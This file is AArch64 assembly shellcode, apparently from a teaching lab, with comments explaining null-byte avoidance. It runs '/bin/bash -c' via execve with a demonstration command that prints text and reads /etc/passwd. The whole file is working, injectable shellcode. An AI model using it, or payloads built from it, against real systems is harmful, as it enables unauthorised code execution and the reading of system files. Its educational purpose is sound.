.equ BASH,     0
.equ BASH_END, 9

.equ OPTC,     10 
.equ OPTC_END, 12

.equ CMD,      16
.equ CMD_END,  79 

.equ ARGV0,  80
.equ ARGV1,  ARGV0  +  8
.equ ARGV2,  ARGV0  + 16
.equ ARGV3,  ARGV0  + 24

.section .text
.global _start

_start:
    // We need to get the absolute address of the <two> section, because that is the data region. 
    // We can use "adr x19, two" to load that address to x19, but it has a zero in the machine code.
    // This is because the offset of <two> is too small, causing zero in the machine code.
    // We can use a larger offset, and then substract the extra value.  
    // Note: The actual offset we want to add to the PC is 0x80, which is the distance between
    //   the following instruction and the <two> section. If we change the code, 
    //   we need to addjust this value accordingly.
    adr  x11, #0x20a0    // x11 = PC + 0x2020 + 0x80
    mov  x12, #0x2020 
    sub  x19, x11, x12   // x19 = PC + 0x0080

    eor w9, w9, w9       // w9 = 0

    mov  x8, BASH_END    // x8 = the offset of the * in "/bin/bash*"
    strb w9, [x19, x8]   // Null-terminate the "/bin/bash" string 

    mov  x8, OPTC_END    // x8 = the offset of the * in "-c*"
    strb w9, [x19, x8]   // Null-terminate the "-c" string 

    mov x8,  CMD_END     // x8 = the offset of the * in the command string
    strb w9, [x19, x8]   // Null-terminate the command string 

store_args:    
    mov x8,  ARGV0
    mov x9,  x19         // x9  = address of the "/bin/bash" string
    str x9, [x19, x8]    // save x9 to argv[0]

    // argv[1] is at x19 + OPTC, so we can use "adds x9, x19, OPTC" to let x9 = x19 + OPTC. 
    // Unfortunately, there is a zero in the machine code. 
    // To solve this problem, we calculate x9 = x19 - (-OPTC) instead.
    mov x8, ARGV1
    mov x9, OPTC
    neg x9, x9
    sub x9, x19, x9      // x9  = address of the "-c" string
    str x9, [x19, x8]    // save x9 to argv[1]

    mov x8, ARGV2
    mov x9, CMD
    neg x9, x9
    sub x9, x19, x9      // x9  = address of the command string
    str x9, [x19, x8]    // save x9 to argv[2]
    
    mov x8, ARGV3
    eor x9, x9, x9       // x9 = 0
    str x9, [x19, x8]    // save 0 to argv[3]
    
execve: 
    mov  x0, x19         // x0 = command string ("/bin/bash")
    adds x1, x19, ARGV0  // x1 = argv[] (pointer to arguments array)
    eor  x20, x20, x20   // x2 = NULL
    mov  x2, x20         // x2 = NULL. Direct do "x2 xor x2" will have a zero in the code
    mov  x8, #221        // 221 is execve's system call number
    svc  #0x1337         // Invoke execve()

two:
    .ascii "/bin/bash*"    // offset = 0;  offset of * is 9
    .ascii "-c****"        // offset = 10; offset of * is 12

    // offset = 16; offset of * is 79
    .ascii "echo Hello 64; head /etc/passwd  #                             *"
//  .ascii "012345678901234567890123456789012345678901234567890123456789****"

    // offset = 16 + 64 = 80, where 64 is the length of the command string
    .space 8, 0xAA   // Placeholder for argv[0]: for address to "/bin/bash"
    .space 8, 0xBB   // Placeholder for argv[1]: for address to "-c"
    .space 8, 0xCC   // Placeholder for argv[2]: for address to the cmd string
    .space 8, 0xDD   // Placeholder for argv[3]: for 0


